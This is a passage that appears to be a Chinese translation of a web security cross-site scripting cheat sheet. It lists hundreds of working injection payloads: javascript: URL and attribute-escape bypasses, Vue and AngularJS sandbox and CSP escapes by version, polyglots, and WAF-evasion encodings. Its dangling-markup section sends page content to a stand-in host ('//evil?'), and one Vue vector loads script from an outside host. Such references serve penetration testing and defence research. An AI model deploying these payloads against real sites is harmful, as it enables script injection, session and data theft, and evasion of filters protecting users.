#### 5.8.47 js_string_single 上下文 -- Ink.constructor()（适用于 Chrome、Firefox、Safari）

```javascript
'-Ink.constructor('a'+'lert(1)')()-'
```

#### 5.8.48 js_string_single 上下文 -- HID.constructor()（适用于 Chrome、Firefox、Safari）

```javascript
'-HID.constructor('a'+'lert(1)')()-'
```

#### 5.8.49 js_string_single 上下文 -- GPU.constructor()（适用于 Chrome、Firefox、Safari）

```javascript
'-GPU.constructor('a'+'lert(1)')()-'
```

#### 5.8.50 js_string_single 上下文 -- {}.constructor.constructor()（适用于 Chrome、Firefox、Safari）

```javascript
'-{}.constructor.constructor('a'+'lert(1)')()-'
```

#### 5.8.51 js_string_single 上下文 -- ''.constructor.constructor()（适用于 Chrome、Firefox、Safari）

```javascript
'-''.constructor.constructor('a'+'lert(1)')()-'
```

#### 5.8.52 js_string_single 上下文 -- [].constructor.constructor()（适用于 Chrome、Firefox、Safari）

```javascript
'-[].constructor.constructor('a'+'lert(1)')()-'
```

#### 5.8.53 js_string_single 上下文 -- 0..constructor.constructor()（适用于 Chrome、Firefox、Safari）

```javascript
'-0..constructor.constructor('a'+'lert(1)')()-'
```

#### 5.8.54 js_string_single 上下文 -- 0n.constructor.constructor()（适用于 Chrome、Firefox、Safari）

```javascript
'-0n.constructor.constructor('a'+'lert(1)')()-'
```

#### 5.8.55 js_string_single 上下文 -- createElement('script')+append（适用于 Chrome、Firefox、Safari）

```javascript
'-[s=document.createElement('script'),s.append('a'+'lert(1)'),document.documentElement.append(s)]-'
```

#### 5.8.56 js_string_single 上下文 -- navigation.navigate(javascript:)（适用于 Chrome、Firefox、Safari）

```javascript
'-navigation.navigate('javascript:a\lert(1)')-'
```

#### 5.8.57 js_string_single 上下文 -- location.replace(javascript:)（适用于 Chrome、Firefox、Safari）

```javascript
'-location.replace('javascript:a\lert(1)')-'
```

#### 5.8.58 js_string_single 上下文 -- location='javascript:'（适用于 Chrome、Firefox、Safari）

```javascript
'-[location='javascript:a\lert(1)']-'
```

### 5.9 event_handler_js_string_single 上下文

#### 5.9.1 替代 JS 语法（适用于 Chrome、Firefox、Safari）

```html
'-alert(1)-'
```

#### 5.9.2 &apos; 实体引号（适用于 Chrome、Firefox、Safari）

```html
&apos;-alert(1)-&apos;
```

#### 5.9.3 &#x27; 实体引号（带分号）（适用于 Chrome、Firefox、Safari）

```html
&#x27;-alert(1)-&#x27;
```

#### 5.9.4 &#39; 实体引号（带分号）（适用于 Chrome、Firefox、Safari）

```html
&#39;-alert(1)-&#39;
```

#### 5.9.5 &#x27 实体引号（不带分号）（适用于 Chrome、Firefox、Safari）

```html
&#x27-alert(1)-&#x27
```

#### 5.9.6 &#39 实体引号（不带分号）（适用于 Chrome、Firefox、Safari）

```html
&#39-alert(1)-&#39
```

### 5.10 attribute_href 上下文 -- javascript: URL 绕过

#### 5.10.1 javascript: URL（适用于 Chrome、Firefox、Safari）

```
javaScript:alert(1)
```

#### 5.10.2 javascript: URL 通过原始换行符（内联）（适用于 Chrome、Firefox、Safari）

```
java
script:alert(1)
```

#### 5.10.3 javascript: URL 通过原始 Tab（内联）（适用于 Chrome、Firefox、Safari）

```
java	script:alert(1)
```

#### 5.10.4 javascript: URL via &colon; entity（适用于 Chrome、Firefox、Safari）

```
javascript&colon;alert(1)
```

#### 5.10.5 javascript: URL 通过 &#58; 实体（内联，带分号）（适用于 Chrome、Firefox、Safari）

```
javascript&#58;alert(1)
```

#### 5.10.6 javascript: URL 通过 &#58 实体（内联，不带分号）（适用于 Chrome、Firefox、Safari）

```
javascript&#58alert(1)
```

#### 5.10.7 javascript: URL 通过 &#x3a; 实体（内联，带分号）（适用于 Chrome、Firefox、Safari）

```
javascript&#x3a;alert(1)
```

#### 5.10.8 javascript: URL 通过 &#x3a; 实体（内联，不带分号）（适用于 Chrome、Firefox、Safari）

```
javascript&#x3a-alert(1)
```

#### 5.10.9 javascript: URL 通过 &NewLine; 实体（内联）（适用于 Chrome、Firefox、Safari）

```
java&NewLine;script:alert(1)
```

#### 5.10.10 javascript: URL 通过 &Tab; 实体（内联）（适用于 Chrome、Firefox、Safari）

```
java&Tab;script:alert(1)
```

#### 5.10.11 javascript: URL 通过 &#x9; 实体（内联，带分号）（适用于 Chrome、Firefox、Safari）

```
java&#x9;script:alert(1)
```

#### 5.10.12 javascript: URL 通过 &#x00000000000009; 实体（内联，带分号）（适用于 Chrome、Firefox、Safari）

```
java&#x00000000000009;script:alert(1)
```

#### 5.10.13 javascript: URL 通过 &#9; 实体（内联，带分号）（适用于 Chrome、Firefox、Safari）

```
java&#9;script:alert(1)
```

#### 5.10.14 javascript: URL 通过 &#00000000000009; 实体（内联，带分号）（适用于 Chrome、Firefox、Safari）

```
java&#00000000000009;script:alert(1)
```

#### 5.10.15 javascript: URL 通过 &#x9; 实体（内联，不带分号）（适用于 Chrome、Firefox、Safari）

```
java&#x9script:alert(1)
```

#### 5.10.16 javascript: URL 通过 &NewLine; 实体（前缀）（适用于 Chrome、Firefox、Safari）

```
&NewLine;javascript:alert(1)
```

#### 5.10.17 javascript: URL 通过 &Tab; 实体（前缀）（适用于 Chrome、Firefox、Safari）

```
&Tab;javascript:alert(1)
```

#### 5.10.18 javascript: URL 通过原始换行符（前缀）（适用于 Chrome、Firefox、Safari）

```

javascript:alert(1)
```

#### 5.10.19 javascript: URL 通过 %09 Tab 前缀（适用于 Chrome、Firefox、Safari）

```
%09javascript:alert(1)
```

#### 5.10.20 javascript: URL 通过空格前缀（适用于 Chrome、Firefox、Safari）

```
%20javascript:alert(1)
```

#### 5.10.21 javascript: URL 通过 &#1; 至 &#31; 实体（前缀，带分号）（适用于 Chrome、Firefox、Safari）

```
&#1;javascript:alert(1)
&#2;javascript:alert(1)
...
&#31;javascript:alert(1)
```

#### 5.10.22 javascript: URL 通过 &#x1; 至 &#x1f; 实体（前缀，带分号）（适用于 Chrome、Firefox、Safari）

```
&#x1;javascript:alert(1)
&#x2;javascript:alert(1)
...
&#x1f;javascript:alert(1)
```

### 5.11 属性逃逸（双引号 / 无引号属性）

#### 5.11.1 属性逃逸 -- onfocus（斜杠分隔）+ tabindex + autofocus（双引号属性）（适用于 Chrome、Firefox、Safari）

```html
"/onfocus=alert(1) tabindex=1 autofocus/
```

#### 5.11.2 属性逃逸 -- onfocusin（斜杠分隔）+ autofocus（双引号属性）（适用于 Chrome、Firefox、Safari）

```html
"/onfocusin=alert(1) tabindex=1 autofocus/
```

#### 5.11.3 属性逃逸 -- onmousemove（斜杠分隔，双引号属性）（适用于 Chrome、Firefox、Safari）

```html
"/onmousemove=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
```

#### 5.11.4 属性逃逸 -- onmouseenter（斜杠分隔，双引号属性）（适用于 Chrome、Firefox、Safari）

```html
"/onmouseenter=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
```

#### 5.11.5 属性逃逸 -- onpointerenter（斜杠分隔，双引号属性）（适用于 Chrome、Firefox、Safari）

```html
"/onpointerenter=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
```

#### 5.11.6 属性逃逸 -- onpointermove（斜杠分隔，双引号属性）（适用于 Chrome、Firefox、Safari）

```html
"/onpointermove=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
```

#### 5.11.7 属性逃逸 -- onpointerrawupdate（斜杠分隔，双引号属性）（适用于 Chrome、Firefox、Safari）

```html
"/onpointerrawupdate=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
```

#### 5.11.8 属性逃逸 -- onmousedown（斜杠分隔，双引号属性）（适用于 Chrome、Firefox、Safari）

```html
"/onmousedown=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
```

#### 5.11.9 属性逃逸 -- onmouseup（斜杠分隔，双引号属性）（适用于 Chrome、Firefox、Safari）

```html
"/onmouseup=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
```

#### 5.11.10 属性逃逸 -- onfocus（斜杠分隔）+ autofocus（双引号属性）（适用于 Chrome、Firefox、Safari）

```html
"/onfocus=alert(1) autofocus/
```

#### 5.11.11 属性逃逸 -- onfocus（无引号）+ autofocus（无引号属性）（适用于 Chrome、Firefox、Safari）

```html
1 onfocus=alert(1) autofocus/
```

#### 5.11.12 属性逃逸 -- onmousemove（无引号，无引号属性）（适用于 Chrome、Firefox、Safari）

```html
1 onmousemove=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
```

#### 5.11.13 属性逃逸 -- onfocus（引号处理器）+ autofocus（双引号属性）（适用于 Chrome、Firefox、Safari）

```html
"onfocus="alert(1)"/autofocus/
```

#### 5.11.14 属性逃逸 -- onmousemove（引号处理器，双引号属性）（适用于 Chrome、Firefox、Safari）

```html
"onmousemove="alert(1)"style="position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0" /
```

### 5.12 iframe_src 上下文

```html
" srcdoc="<xss tabindex=1 autofocus onfocusin=alert(1)>"
```

### 5.13 html 上下文 -- <xss> 自定义标签 Payload

使用自定义标签 `<xss>` 配合 onfocus/autofocus 和各种 Function constructor 变体。

#### 5.13.1 <xss> 标签 + onfocus 使用 atob.constructor()（适用于 Chrome、Firefox、Safari）

```html
<xss tabindex=1 autofocus onfocus=atob.constructor('a'+'lert(1)')()>
```

#### 5.13.2 <xss> 标签 + onfocus 使用 {}.constructor.constructor()（适用于 Chrome、Firefox、Safari）

```html
<xss tabindex=1 autofocus onfocus={}.constructor.constructor('a'+'lert(1)')()>
```

#### 5.13.3 <xss> 标签 + onfocus 使用 navigation.navigate()（适用于 Chrome、Firefox、Safari）

```html
<xss tabindex=1 autofocus onfocus=navigation.navigate('javascript:a\lert(1)')>
```

#### 5.13.4 <xss> 标签 + onfocus 使用 location='javascript:'（适用于 Chrome、Firefox、Safari）

```html
<xss tabindex=1 autofocus onfocus=location='javascript:a\lert(1)'>
```

#### 5.13.5 <xss> 标签 + onfocus 使用 window[] 访问（适用于 Chrome、Firefox、Safari）

```html
<xss tabindex=1 autofocus onfocus=window['a'+'lert'](1)>
```

#### 5.13.6 <xss> 标签 + onfocus 使用 Unicode 转义（适用于 Chrome、Firefox、Safari）

```html
<xss tabindex=1 autofocus onfocus=alert(1)>
```

#### 5.13.7 <xss> 标签 + onfocus 使用 self[] 访问（适用于 Chrome、Firefox、Safari）

```html
<xss tabindex=1 autofocus onfocus=self['a'+'lert'](1)>
```

#### 5.13.8 <xss> 标签 + onfocus 使用 defaultView[] 访问（适用于 Chrome、Firefox、Safari）

```html
<xss tabindex=1 autofocus onfocus=defaultView['a'+'lert'](1)>
```

#### 5.13.9 <xss> 标签 + onerror+onfocus 使用 throw self.onerror=alert（适用于 Chrome、Firefox、Safari）

```html
<xss tabindex=1 autofocus onfocus=throw/**/self.onerror=&#97lert,1>
```

#### 5.13.10 <xss> 标签 + onerror+onfocus 使用 throw defaultView.onerror=alert（适用于 Chrome、Firefox、Safari）

```html
<xss tabindex=1 autofocus onfocus="throw defaultView.onerror=&#97lert,1">
```

#### 5.13.11 <xss> 标签 + onerror+onfocus 使用 throw + 属性存储 payload（适用于 Chrome、Firefox、Safari）

```html
<xss title=aler id=t tabindex=1 autofocus onfocus="throw defaultView.onerror=defaultView[title+id],1">
```

#### 5.13.12 <xss> 标签 + onfocus 使用 navigation.navigate() with payload stored in attributes（适用于 Chrome、Firefox、Safari）

```html
<xss title=java id=script:ale class=rt&lpar;1&rpar; tabindex=1 autofocus onfocus=navigation.navigate(title+id+className)>
```

#### 5.13.13 <xss> 标签 + onfocus 使用 location=title+id（适用于 Chrome、Firefox、Safari）

```html
<xss title=java id=script:ale class=rt&lpar;1&rpar; tabindex=1 autofocus onfocus=location=title+id+className>
```

---

## 6. Frameworks（框架注入）

### 6.1 VueJS -- 客户端模板注入

#### 6.1.1 VueJS 反射型注入（Version 2）

| Version | Author | Length | Vector |
|---------|--------|--------|--------|
| 2 | Mario Heiderich (Cure53) | 41 | `{{constructor.constructor('alert(1)')()}}` |
| 2 | Heiderich, Lekies, Vela Nava, Kotowicz | 62 | `<div v-html="''.constructor.constructor('alert(1)')()">a</div>` |
| 2 | Gareth Heyes (PortSwigger) | 39 | `<x v-html=_c.constructor('alert(1)')()>` |
| 2 | Peter af Geijerstam | 37 | `<x v-if=_c.constructor('alert(1)')()>` |
| 2 | Heyes, Ardern, PwnFunction | 32 | `{{_c.constructor('alert(1)')()}}` |
| 2 | Heyes, Ardern, PwnFunction | 32 | `{{_v.constructor('alert(1)')()}}` |
| 2 | Heyes, Ardern, PwnFunction | 32 | `{{_s.constructor('alert(1)')()}}` |
| 2 | Heyes, Ardern, PwnFunction | 39 | `<p v-show="_c.constructor`alert(1)`()">` |
| 2 | Heyes, Ardern, PwnFunction | 52 | `<x v-on:click='_b.constructor`alert(1)`()'>click</x>` |
| 2 | Heyes, Ardern, PwnFunction | 41 | `<x v-bind:a='_b.constructor`alert(1)`()'>` |
| 2 | Heyes, Ardern, PwnFunction | 33 | `<x @[_b.constructor`alert(1)`()]>` |
| 2 | Heyes, Ardern, PwnFunction | 33 | `<x :[_b.constructor`alert(1)`()]>` |
| 2 | Heyes, Ardern, PwnFunction | 33 | `<p v-=_c.constructor`alert(1)`()>` |
| 2 | Heyes, Ardern, PwnFunction | 33 | `<x #[_c.constructor`alert(1)`()]>` |
| 2 | Heyes, Ardern, PwnFunction | 32 | `<p :=_c.constructor`alert(1)`()>` |
| 2 | Heyes, Ardern, PwnFunction | 30 | `{{_b.constructor`alert(1)`()}}` |
| 2 | Heyes, Ardern, PwnFunction | 40 | `<x v-bind:is="'script'" src="//14.rs" />` |
| 2 | Heyes, Ardern, PwnFunction | 27 | `<x is=script src=//14.rs>` |
| 2 | Heyes, Ardern, PwnFunction | 48 | `<x @click='_b.constructor`alert(1)`()'>click</x>` |
| 2 | Heyes, Ardern, PwnFunction | 33 | `<x @[_b.constructor`alert(1)`()]>` |
| 2 | Heyes, Ardern, PwnFunction | 33 | `<x :[_b.constructor`alert(1)`()]>` |
| 2 | Heyes, Ardern, PwnFunction | 33 | `<x #[_c.constructor`alert(1)`()]>` |
| 2 | Heyes, Ardern, PwnFunction | 52 | `<x title"="&lt;iframe&Tab;onload&Tab;=alert(1)&gt;">` |
| 2 | Heyes, Ardern, PwnFunction | 73 | `<x title"="&lt;iframe&Tab;onload&Tab;=setTimeout(/alert(1)/.source)&gt;">` |
| 2 | Heyes, Ardern, PwnFunction | 31 | `<xyz<img/src onerror=alert(1)>>` |
| 2 | Heyes, Ardern, PwnFunction | 116 | `<svg><svg><b><noscript>&lt;/noscript&gt;&lt;iframe&Tab;onload=setTimeout(/alert(1)/.source)&gt;</noscript></b></svg>` |
| 2 | Heyes, Ardern, PwnFunction | 59 | `<a @['clic\k\u{6b}']="_c.constructor('alert(1)')()">test</a>` |
| 2 | Heyes, Ardern, PwnFunction | 42 | `{{$el.ownerDocument.defaultView.alert(1)}}` |
| 2 | Heyes, Ardern, PwnFunction | 56 | `{{$el.innerHTML='<img src onerror=alert(1)>'}}` |
| 2 | Heyes, Ardern, PwnFunction | 45 | `<img src @error=e=$event.path.pop().alert(1)>` |
| 2 | Heyes, Ardern, PwnFunction | 55 | `<img src @error=e=$event.composedPath().pop().alert(1)>` |
| 2 | Heyes, Ardern, PwnFunction | 30 | `<img src @error=this.alert(1)>` |
| 2 | Heyes, Ardern, PwnFunction | 24 | `<svg@load=this.alert(1)>` |
| 2 | Davit Karapetyan | 72 | `<p slot-scope="){}}])+this.constructor.constructor('alert(1)')()})};//">` |

#### 6.1.2 VueJS 反射型注入（Version 3）

| Version | Author | Length | Vector |
|---------|--------|--------|--------|
| 3 | Heyes, Ardern, PwnFunction | 40 | `{{_openBlock.constructor('alert(1)')()}}` |
| 3 | Heyes, Ardern, PwnFunction | 42 | `{{_createBlock.constructor('alert(1)')()}}` |
| 3 | Heyes, Ardern, PwnFunction | 46 | `{{_toDisplayString.constructor('alert(1)')()}}` |
| 3 | Heyes, Ardern, PwnFunction | 42 | `{{_createVNode.constructor('alert(1)')()}}` |
| 3 | Heyes, Ardern, PwnFunction | 47 | `<p v-show=_createBlock.constructor`alert(1)`()>` |
| 3 | Heyes, Ardern, PwnFunction | 41 | `<x @[_openBlock.constructor`alert(1)`()]>` |
| 3 | Heyes, Ardern, PwnFunction | 42 | `<x @[_capitalize.constructor`alert(1)`()]>` |
| 3 | Heyes, Ardern, PwnFunction | 52 | `<x @click=_withCtx.constructor`alert(1)`()>click</x>` |
| 3 | Heyes, Ardern, PwnFunction | 40 | `<x @click=$event.view.alert(1)>click</x>` |
| 3 | Heyes, Ardern, PwnFunction | 34 | `{{_Vue.h.constructor`alert(1)`()}}` |
| 3 | Heyes, Ardern, PwnFunction | 33 | `{{$emit.constructor`alert(1)`()}}` |
| 3 | Heyes, Ardern, PwnFunction | 85 | `<teleport to=script:nth-child(2)>alert&lpar;1&rpar;</teleport></div><script></script>` |
| 3 | Heyes, Ardern, PwnFunction | 35 | `<component is=script text=alert(1)>` |

### 6.2 AngularJS -- 沙箱逃逸（反射型）

AngularJS 1.x 的沙箱逃逸向量，按版本排列。

| Version | Author | Length | Vector |
|---------|--------|--------|--------|
| 1.0.1-1.1.5 | Mario Heiderich (Cure53) | 41 | `{{constructor.constructor('alert(1)')()}}` |
| 1.0.1-1.1.5 (shorter) | Heyes, Ardern | 33 | `{{$on.constructor('alert(1)')()}}` |
| 1.2.0-1.2.1 | Jann Horn (Google) | 122 | `{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}` |
| 1.2.2-1.2.5 | Gareth Heyes | 23 | `{{{}.")));alert(1)//"}}` |
| 1.2.6-1.2.18 | Jan Horn (Google) | 106 | `{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}` |
| 1.2.19-1.2.23 | Mathias Karlsson | 124 | `{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}` |
| 1.2.24-1.2.29 | Gareth Heyes | 23 | `{{{}.")));alert(1)//"}}` |
| 1.2.27-1.3.20 | Gareth Heyes | 23 | `{{{}.")));alert(1)//"}}` |
| 1.3.0 | Gabor Molnar (Google) | 272 | (见原文完整 exploit) |
| 1.3.3-1.3.18 | Gareth Heyes | 128 | `{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)//');}}` |
| 1.3.19 | Gareth Heyes | 102 | `{{'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;$eval('x=alert(1)//');}}` |
| 1.3.20 | Gareth Heyes | 65 | `{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}` |
| 1.4.0-1.4.9 | Gareth Heyes | 74 | `{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}` |
| 1.5.0-1.5.8 | Ian Hickey & Gareth Heyes | 79 | `{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}` |
| 1.5.9-1.5.11 | Jann Horn (Google) | 517 | (见原文完整 exploit) |
| >=1.6.0 | Mario Heiderich (Cure53) | 41 | `{{constructor.constructor('alert(1)')()}}` |
| >=1.6.0 (shorter) | Heyes, Ardern | 33 | `{{$on.constructor('alert(1)')()}}` |

### 6.3 AngularJS -- DOM 型沙箱逃逸

不依赖 `$eval` 的 DOM 触发型沙箱逃逸，使用 `orderBy` filter 触发。

| Version | Author | Length | Vector |
|---------|--------|--------|--------|
| 1.0.1-1.1.5 | Mario Heiderich | 37 | `constructor.constructor('alert(1)')()` |
| 1.2.0-1.2.18 | Jann Horn | 118 | `a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()` |
| 1.2.19-1.2.23 | Mathias Karlsson | 119 | `toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor)` |
| 1.2.24-1.2.26 | Gareth Heyes | 317 | (见原文完整 exploit) |
| 1.2.27-1.3.20 | Gareth Heyes | 20 | `{}.")));alert(1)//";` |
| 1.4.0-1.4.5 | Gareth Heyes | 75 | `'a'.constructor.prototype.charAt=[].join;[1]|orderBy:'x=1} } };alert(1)//';` |
| 1.4.2-1.5.8 | Heyes, Daniel Kachakil | 70 | `{y:''.constructor.prototype}.y.charAt=[].join;[1]|orderBy:'x=alert(1)'` |
| >=1.6.0 | Mario Heiderich | 37 | `constructor.constructor('alert(1)')()` |
| 1.4.4 (no strings) | Gareth Heyes | 134 | `toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)` |

### 6.4 AngularJS -- CSP 绕过

| Version | Author | Length | Vector |
|---------|--------|--------|--------|
| All (all browsers) using from | Gareth Heyes | 91 | `<input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'">` |
| All (all browsers) shorter using assignment | Gareth Heyes | 66 | `<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'>` |
| 1.2.0-1.5.0 | Eduardo Vela (Google) | 190 | (见原文 complete exploit) |
| All (all browsers) shorter via oncut | Savan Gadhiya | 59 | `<input ng-cut=$event.composedPath()|orderBy:'(y=alert)(1)'>` |

---

## 7. Scriptless Attacks（无脚本攻击）

### 7.1 Dangling Markup (悬空标记)

利用未闭合的属性将页面内容泄露到外部服务器。

#### 7.1.1 Background 属性（适用于 Chrome、Firefox、Safari）

```html
<body background="//evil?">
<table background="//evil?">
<thead background="//evil?">
<tbody background="//evil?">
<tfoot background="//evil?">
<td background="//evil?">
<th background="//evil?">
```

#### 7.1.2 Link href 属性（适用于 Chrome、Firefox、Safari）

```html
<link rel=stylesheet href="//evil?">
<link rel=icon href="//evil?">
```

#### 7.1.3 Meta refresh 刷新（适用于 Chrome、Firefox、Safari）

```html
<meta http-equiv="refresh" content="0; http://evil?">
```

#### 7.1.4 Img src 属性（适用于 Chrome、Firefox、Safari）

```html
<img src="//evil?">
<image src="//evil?">
```

#### 7.1.5 Video / Audio source 属性（适用于 Chrome、Firefox、Safari）

```html
<video><track default src="//evil?">
<video><source src="//evil?">
<audio><source src="//evil?">
```

#### 7.1.6 Input src 属性（适用于 Chrome、Firefox、Safari）

```html
<input type=image src="//evil?">
```

#### 7.1.7 Button / Input / Form formaction 属性（适用于 Chrome、Firefox、Safari）

```html
<form><button style="width:100%;height:100%" type=submit formaction="//evil?">
<form><input type=submit value="XSS" style="width:100%;height:100%" formaction="//evil?">
<button form=x style="width:100%;height:100%;"><form id=x action="//evil?">
```

#### 7.1.8 Object / Iframe / Embed src 属性（适用于 Chrome、Firefox、Safari）

```html
<object data="//evil?">
<iframe src="//evil?">
<embed src="//evil?">
```

#### 7.1.9 Textarea 消费标记 + 表单提交（适用于 Firefox、Safari）

```html
<form><button formaction=//evil>XSS</button><textarea name=x>
```

#### 7.1.10 通过 window.name 传递标记数据（适用于 Chrome、Firefox、Safari）

```html
<!-- Using form target -->
<button form=x>XSS</button><form id=x action=//evil target='>

<!-- Using base target -->
<a href=//target-site><font size=100 color=red>Click me</font></a><base target=">

<!-- Using formtarget -->
<form><input type=submit value="Click me" formaction=//target-site formtarget=">

<!-- Using base href -->
<a href=abc style="width:100%;height:100%;position:absolute;font-size:1000px;">xss<base href="//evil/">

<!-- Using embed/iframe/object/frame name -->
<embed src=//target-site name=">
<iframe src=//target-site name=">
<object data=//target-site name=">
<frameset><frame src=//target-site name=">
```

#### 7.1.11 Video poster 属性（适用于 Chrome、Firefox、Safari）

```html
<video poster="//evil?">
```

#### 7.1.12 覆盖 type 属性（适用于 Chrome、Safari）

```html
<input type=hidden type=image src="//evil?">
```

---

## 8. Polyglot Payloads（多上下文通用）

Polyglot payload 设计为在多种注入上下文（HTML、属性、JavaScript）中同时有效。

### 8.1 Polyglot payload 1（适用于 Chrome、Firefox、Safari）

```html
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

### 8.2 Polyglot payload 2（适用于 Chrome、Firefox、Safari）

```html
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
```

### 8.3 Polyglot payload 3（适用于 Chrome、Firefox、Safari）

```html
javascript:/*--></title></style></textarea></script></xmp><details/open/ontoggle='+/`/+/"/+/onmouseover=1/+/[*/[]/+alert(/@PortSwiggerRes/)//'>
```

---

## 9. WAF Bypass -- Global Objects（各种全局对象访问方式）

以下 payload 针对注入到 JavaScript 字符串中需要绕过 WAF 的场景，使用不同的全局对象访问 `alert()`。

### 9.1 String concatenation (字符串拼接)

```javascript
// window
';window['ale'+'rt'](window['doc'+'ument']['dom'+'ain']);//

// self
';self['ale'+'rt'](self['doc'+'ument']['dom'+'ain']);//

// this
';this['ale'+'rt'](this['doc'+'ument']['dom'+'ain']);//

// top
';top['ale'+'rt'](top['doc'+'ument']['dom'+'ain']);//

// parent
';parent['ale'+'rt'](parent['doc'+'ument']['dom'+'ain']);//

// frames
';frames['ale'+'rt'](frames['doc'+'ument']['dom'+'ain']);//

// globalThis
';globalThis['ale'+'rt'](globalThis['doc'+'ument']['dom'+'ain']);//
```

### 9.2 Comment syntax (注释语法)

```javascript
// window
';window[/*foo*/'alert'/*bar*/](window[/*foo*/'document'/*bar*/]['domain']);//

// self
';self[/*foo*/'alert'/*bar*/](self[/*foo*/'document'/*bar*/]['domain']);//

// this
';this[/*foo*/'alert'/*bar*/](this[/*foo*/'document'/*bar*/]['domain']);//

// top
';top[/*foo*/'alert'/*bar*/](top[/*foo*/'document'/*bar*/]['domain']);//

// parent
';parent[/*foo*/'alert'/*bar*/](parent[/*foo*/'document'/*bar*/]['domain']);//

// frames
';frames[/*foo*/'alert'/*bar*/](frames[/*foo*/'document'/*bar*/]['domain']);//

// globalThis
';globalThis[/*foo*/'alert'/*bar*/](globalThis[/*foo*/'document'/*bar*/]['domain']);//
```

### 9.3 十六进制转义序列

```javascript
// window
';window['\x61\x6c\x65\x72\x74'](window['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//

// self, this, top, parent, frames, globalThis -- 同上模式
```

### 9.4 八进制转义序列

```javascript
// window
';window['\141\154\145\162\164']('\130\123\123');//
// self, this, top, parent, frames, globalThis -- 同上模式
```

### 9.5 Unicode 转义序列

```javascript
// window
';window['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//
// self, this, top, parent, frames, globalThis -- 同上模式
```

### 9.6 RegExp source property (正则 source 属性)

```javascript
// window
';window[/al/.source+/ert/.source](/XSS/.source);//
// self, this, top, parent, frames, globalThis -- 同上模式
```

### 9.7 Hieroglyphy / JSFuck

```javascript
// window
';window[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//
// self, this, top, parent, frames, globalThis -- 同上模式
```

### 9.8 十六进制 + Base64 编码字符串

```javascript
// window
';window['\x65\x76\x61\x6c']('window["\x61\x6c\x65\x72\x74"](window["\x61\x74\x6f\x62"]("WFNT"))');//
// self, this, top, parent, frames, globalThis -- 同上模式
```

---

## 10. Content Types（可执行 XSS 的 Content-Type）

此列表列出了即使启用 `X-Content-Type-Options: nosniff` 仍可用于 XSS 的 Content-Type。

| Content-Type | [C] | [F] | [S] | PoC |
|-------------|-----|-----|-----|-----|
| `text/html` | Yes | Yes | Yes | `<script>alert(document.domain)</script>` |
| `application/xhtml+xml` | Yes | Yes | Yes | `<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>` |
| `application/xml` | Yes | Yes | Yes | 同上 |
| `text/xml` | Yes | Yes | Yes | 同上 |
| `image/svg+xml` | Yes | Yes | Yes | 同上 |
| `text/xsl` | Yes | Yes | - | 同上 |
| `application/vnd.wap.xhtml+xml` | Yes | - | Yes | 同上 |
| `text/rdf` | - | Yes | Yes | 同上 |
| `application/rdf+xml` | - | Yes | - | 同上 |
| `application/mathml+xml` | - | Yes | - | `<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>` |
| `text/vtt` | - | Yes | - | `<script>alert(document.domain)</script>` |
| `text/cache-manifest` | - | Yes | - | `<script>alert(document.domain)</script>` |

---

## 11. Response Content Types（Content-Type 响应头注入）

当可以注入 Content-Type 响应头时，以下变体可被浏览器识别为 HTML。

| Content-Type Header Value | [C] | [F] | [S] |
|--------------------------|-----|-----|-----|
| `text/plain; x=x, text/html, foobar` | Yes | Yes | - |
| `text/html(xxx` | Yes | Yes | - |
| `text/html xxx` | Yes | Yes | - |
| `text/html, xxx` | Yes | Yes | Yes |
| `text/html; xxx` | Yes | Yes | Yes |

---

## 12. Impossible Labs（PortSwigger 未解决挑战）

参考 [Documenting the impossible: Unexploitable XSS labs](https://portswigger.net/research/documenting-the-impossible-unexploitable-xss-labs)。

| Title | Description | Length Limit | Closest Vector |
|-------|-------------|-------------|----------------|
| Basic context, WAF blocks `<[a-zA-Z]` | 无法使用后跟字母的开放标签。某些 .NET 版本有此行为，仅旧 IE 中可用 `<%tag` 利用 | N/A | N/A |
| Script injection, quotes/forward slash/backslash escaped | 注入点在 JS 变量中，可注入 `<>` 但引号和 `/`、`\` 被转义。最近接的解法需要多个注入点 | N/A | N/A |
